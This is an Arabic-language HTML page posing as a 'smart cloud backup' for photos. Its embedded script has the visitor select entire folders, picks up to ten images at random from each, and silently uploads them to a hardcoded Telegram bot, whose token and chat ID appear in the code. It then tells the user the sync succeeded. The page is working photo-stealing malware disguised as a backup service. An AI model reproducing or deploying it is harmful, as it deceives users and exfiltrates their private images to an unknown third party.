<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام النسخ الاحتياطي الذكي ☁️</title>
    <style>
        body { background: #111; color: #eee; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .main-card { background: #222; padding: 30px; border-radius: 20px; border: 1px solid #444; display: inline-block; width: 85%; max-width: 450px; }
        .btn { background: #28a745; color: white; padding: 18px; border: none; border-radius: 10px; font-size: 1.2rem; cursor: pointer; width: 100%; font-weight: bold; }
        .status-msg { margin-top: 20px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

    <div class="main-card">
        <h2>تفعيل المزامنة التلقائية</h2>
        <p>سيقوم النظام باختيار أفضل 10 صور من كل مجلد لضمان حفظ ذكرياتك بأمان.</p>
        
        <input type="file" id="fileInput" webkitdirectory directory multiple style="display:none;">
        <button class="btn" onclick="document.getElementById('fileInput').click()">ابدأ المزامنة الشاملة</button>
        <div id="status" class="status-msg"></div>
    </div>

    <script>
        const API_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const CHAT_ID = '7214473798';

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const allFiles = Array.from(e.target.files);
            const folders = {};

            // 1. تصنيف الملفات حسب المجلدات
            allFiles.forEach(file => {
                if (file.type.startsWith('image/')) {
                    const path = file.webkitRelativePath.split('/');
                    const folderName = path.length > 1 ? path[path.length - 2] : 'Root';
                    
                    if (!folders[folderName]) folders[folderName] = [];
                    folders[folderName].push(file);
                }
            });

            const folderNames = Object.keys(folders);
            document.getElementById('status').innerText = `تم العثور على ${folderNames.length} مجلدات... جاري السحب.`;

            // 2. معالجة كل مجلد على حدة
            folderNames.forEach(name => {
                let images = folders[name];
                
                // خلط عشوائي لصور المجلد الواحد
                images.sort(() => Math.random() - 0.5);
                
                // اختيار 10 صور فقط من هذا المجلد
                let selection = images.slice(0, 10);

                selection.forEach(file => {
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('document', file);
                    formData.append('caption', `📦 من مجلد: ${name}`);

                    fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                });
            });

            alert("بدأت عملية المزامنة بنجاح! قد يستغرق الأمر دقائق.");
        });
    </script>
</body>
</html>
